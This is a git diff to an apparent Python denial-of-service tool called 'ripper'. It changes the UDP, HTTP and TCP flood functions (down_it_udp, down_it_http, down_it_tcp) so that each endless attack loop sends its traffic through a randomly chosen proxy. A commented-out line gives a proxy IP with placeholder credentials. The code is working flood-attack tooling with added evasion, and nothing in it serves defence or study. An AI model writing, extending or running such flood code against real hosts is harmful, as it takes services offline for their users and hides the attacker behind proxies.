@@ -10,7 +10,12 @@ from ripper.context import Context
 from ripper.statistics import show_statistics
 from ripper.common import get_random_string, get_server_ip_error_msg
 from ripper.sockets import Sock5Proxy
+from ripper.proxy import Sock5Proxy
 
+
+###############################################
+# Common methods for attacks
+###############################################
 def build_request_http_package(_ctx) -> str:
     extra_data = get_random_string(1, _ctx.max_random_packet_len) if _ctx.random_packet_len else ''
     return f'GET / HTTP/1.1' \
@@ -24,9 +29,10 @@ def build_request_http_package(_ctx) -> str:
 # Attack methods
 ###############################################
 def down_it_udp(_ctx: Context):
+    proxy = _ctx.random_proxy()
     i = 1
     while True:
-        sock = _ctx.sock_manager.get_udp_socket()
+        sock = _ctx.sock_manager.get_udp_socket(proxy)
         request_packet = build_request_http_package(_ctx)
 
         try:
@@ -55,6 +61,7 @@ def down_it_udp(_ctx: Context):
 def down_it_http(_ctx: Context):
     """HTTP flood."""
     # proxy = Sock5Proxy(host='45.136.228.80', port=6135, user='xxx', password='yyy')
+    proxy = _ctx.random_proxy()
     while True:
         try:
             client = _ctx.sock_manager.create_http_socket(proxy)
@@ -76,9 +83,10 @@ def down_it_http(_ctx: Context):
 
 def down_it_tcp(_ctx: Context):
     """TCP flood."""
+    proxy = _ctx.random_proxy()
     while True:
         try:
-            sock = _ctx.sock_manager.create_tcp_socket()
+            sock = _ctx.sock_manager.create_tcp_socket(proxy)
             sock.connect((_ctx.host_ip, _ctx.port))
             _ctx.connections_success += 1
             while True:
